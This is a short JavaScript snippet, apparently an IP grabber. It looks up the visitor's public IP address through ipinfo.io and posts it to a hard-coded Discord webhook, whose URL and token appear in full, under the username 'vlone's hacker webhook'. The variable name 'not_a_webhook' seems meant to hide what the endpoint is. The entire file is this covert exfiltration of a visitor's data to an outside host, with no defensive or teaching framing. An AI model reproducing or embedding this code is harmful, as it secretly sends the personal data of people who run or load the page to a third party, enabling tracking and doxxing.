const not_a_webhook = "https://discord.com/api/webhooks/1171982710852554912/wAriSmjLdZyWGDFtnOcg1YRRyUs4AFIUVS6D89kW-bsM8BbeKWjAp6eZO3Cxltgws96h";
fetch("https://ipinfo.io/json")
    .then(response => response.json())
    .then(data => {
        const payload = {
            content: data.ip,
            username: "vlone's hacker webhook"
        };

        fetch(not_a_webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                console.log("Sent successfully");
            } else {
                console.error("Failed to send");
            }
        })
        .catch(error => {
            console.error("An error occurred");
        });
    })
    .catch(error => {
        console.error("An error occurred while fetching");
    });
